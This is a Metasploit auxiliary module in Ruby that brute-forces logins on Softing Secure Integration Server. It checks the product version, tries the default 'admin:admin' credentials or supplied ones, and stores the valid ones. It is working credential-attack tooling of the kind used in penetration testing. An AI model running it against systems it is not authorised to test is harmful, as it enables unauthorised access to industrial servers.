##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/login_scanner/softing_sis'
require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Softing Secure Integration Server Login Utility',
        'Description' => %q{
          This module will attempt to authenticate to a Softing Secure Integration Server.
        },
        'Author' => [ 'Imran E. Dawoodjee <imrandawoodjee.infosec[at]gmail.com>' ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        },
        'DefaultOptions' => {
          'RPORT' => 8099,
          'SSL' => false,
          'SSLVersion' => 'TLS1'
        }
      )
    )

    deregister_options('PASSWORD_SPRAY')

    # credentials are "admin:admin" by default
    register_options(
      [
        OptString.new('USERNAME', [false, 'The username to specify for authentication.', 'admin']),
        OptString.new('PASSWORD', [false, 'The password to specify for authentication.', 'admin'])
      ]
    )
  end

  def scanner(ip)
    cred_collection = build_credential_collection(
      username: datastore['USERNAME'],
      password: datastore['PASSWORD']
    )

    return Metasploit::Framework::LoginScanner::SoftingSIS.new(
      configure_http_login_scanner(
        host: ip,
        port: datastore['RPORT'],
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 5
      )
    )
  end

  def report_good_cred(result)
    service_data = { status: result.status }.merge(service_details)
    store_valid_credential(
      user: result.credential.public,
      private: result.credential.private,
      proof: result.proof,
      service_data: service_data
    )
  end

  def report_bad_cred(ip, rport, result)
    invalidate_login(
      address: ip,
      port: rport,
      protocol: 'tcp',
      public: result.credential.public,
      private: result.credential.private,
      realm_key: result.credential.realm_key,
      realm_value: result.credential.realm,
      status: result.status,
      proof: result.proof
    )
  end

  def bruteforce(ip)
    scanner(ip).scan! do |result|
      case result.status
      when Metasploit::Model::Login::Status::SUCCESSFUL
        print_brute(level: :good, ip: ip, msg: "Success: '#{result.credential}'")
        report_good_cred(result)
      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
        print_brute(level: :verror, ip: ip, msg: result.proof)
        report_bad_cred(ip, rport, result)
      when Metasploit::Model::Login::Status::INCORRECT
        print_brute(level: :verror, ip: ip, msg: "Failed: '#{result.credential}'")
        report_bad_cred(ip, rport, result)
      when Metasploit::Model::Login::Status::DENIED_ACCESS
        print_brute(level: :verror, ip: ip, msg: "Access denied: '#{result.credential}'")
        report_bad_cred(ip, rport, result)
      end
    end
  end

  def run_host(ip)
    softing_ver = scanner(ip).check_setup
    # if we get "false", throw the error
    unless softing_ver
      print_brute(level: :error, ip: ip, msg: 'Target is not Softing Secure Integration Server')
      return
    end

    # otherwise, report the version
    print_brute(level: :good, ip: ip, msg: "Softing Secure Integration Server #{softing_ver}")
    bruteforce(ip)
  end

end
